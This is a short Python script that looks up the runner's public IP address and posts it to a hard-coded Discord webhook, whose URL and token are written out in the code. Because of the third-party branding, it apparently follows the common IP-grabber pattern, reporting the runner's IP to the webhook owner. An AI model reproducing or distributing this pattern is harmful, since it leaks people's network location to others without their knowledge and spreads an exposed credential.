import requests

# Your Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1301509768615301141/rnswrsYbi6Ja_C_xZQrQqvfEC8cdyVIqEewktzq3cLnaQ1O4WRGvmiMSWyvZuYsMiLxq'

# Create an embed message with your public IP
data = {
    "embeds": [
        {
            "title": "Made by totem cutie",
            "description": f"Your public IP address is: {requests.get('https://api.ipify.org').text}",
            "color": 3447003  # Blue color
        }
    ]
}

# Send the HTTP POST request to the webhook URL
response = requests.post(WEBHOOK_URL, json=data)

# Check if the request was successful
if response.status_code == 204:
    print("Embed sent successfully!")
else:
    print(f"Failed to send embed. Status code: {response.status_code}")
